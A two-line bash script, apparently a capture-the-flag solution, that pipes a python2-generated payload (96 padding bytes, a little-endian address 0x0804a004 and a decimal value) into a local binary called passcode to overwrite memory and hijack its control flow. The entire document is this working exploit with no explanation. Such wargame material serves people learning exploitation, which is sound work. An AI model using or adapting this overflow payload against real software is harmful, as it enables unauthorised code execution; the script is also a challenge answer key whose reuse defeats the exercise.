#!/bin/bash

python2 -c "print 'A'*96 + '\x04\xa0\x04\x08134514147\n'" | ./passcode

